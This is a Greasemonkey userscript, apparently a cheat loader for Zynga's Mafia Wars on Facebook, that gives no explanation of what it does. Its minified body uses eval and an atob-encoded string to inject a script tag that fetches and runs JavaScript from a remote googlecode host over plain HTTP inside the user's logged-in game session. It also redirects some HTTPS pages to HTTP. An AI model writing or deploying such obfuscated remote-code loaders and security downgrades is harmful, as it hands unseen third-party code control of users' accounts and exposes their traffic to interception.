// ==UserScript==
// @name        Tuyul Gundul
// @description Automatic
// @namespace   demonkiller
// @description Bikin Ngiller yg udah Beli Mahal :)))))
// @include     http://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     https://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     http://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     http://mwfb.zynga.com/mwfb/remote/html_server.php*
// @include     http://facebook.mafiawars.zynga.com/mwfb/xd_receiver.htm
// @include     http://apps.facebook.com/inthemafia/*
// @include     http://apps.new.facebook.com/inthemafia/*
// @include     http://www.facebook.com/connect/uiserver*
// @include     https://www.facebook.com/dialog/feed*
// @exclude     http://mwfb.zynga.com/mwfb/*#*
// @exclude     http://facebook.mafiawars.zynga.com/mwfb/*#*
// @exclude     http://apps.facebook.com/inthemafia/sk_updater.php*
// @exclude	http://facebook.mafiawars.zynga.com/mwfb/iframe_proxy.php*
// @include     https://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     https://mwfb.zynga.com/mwfb/remote/html_server.php*
// @include     https://facebook.mafiawars.zynga.com/mwfb/xd_receiver.htm
// @include     https://apps.facebook.com/inthemafia/*
// @include     https://apps.new.facebook.com/inthemafia/*
// @include     https://www.facebook.com/connect/uiserver*
// @exclude     https://mwfb.zynga.com/mwfb/*#*
// @exclude     https://facebook.mafiawars.zynga.com/mwfb/*#*
// @exclude     https://apps.facebook.com/inthemafia/sk_updater.php*
// @exclude	https://facebook.mafiawars.zynga.com/mwfb/iframe_proxy.php*
// @include     http://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     https://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @updateURL   http://userscripts.org/scripts/source/159487.meta.js
// @downloadURL http://userscripts.org/scripts/source/159487.user.js
// @version     Vegasus 0.1
// ==/UserScript==
{function itoj(j){var s=document.createElement("script");s.id=eval(m);s.innerHTML=eval(j);document.body.appendChild(s);};var k="{var a=document.createElement('script');a.type='text/javascript';a.src='http://gbr.googlecode.com/files/dem1009bjk01.js';document.getElementsByTagName('head')[0].appendChild(a)}";var l=document.location.href;var m=atob('R01faW5mby5zY3JpcHQubmFtZXNwYWNl');if(!/xw_controller=freegifts/.test(l)&&!/xw_controller=requests/.test(l)){if(/https:\/\//.test(l)&&(/YTozOntpOjA7czo1OiJpbmRleCI7aToxO3M6NDoidmlldyI7aToyO3M6NjoiJnNzbD0wIjt9/.test(l)||/ssl=0/.test(l)||/mw_rdcnt2=1/.test(l)))document.location.href=l.replace(/https:\/\//g,"http://");else if(/html_server\.php/.test(l))itoj(k);}}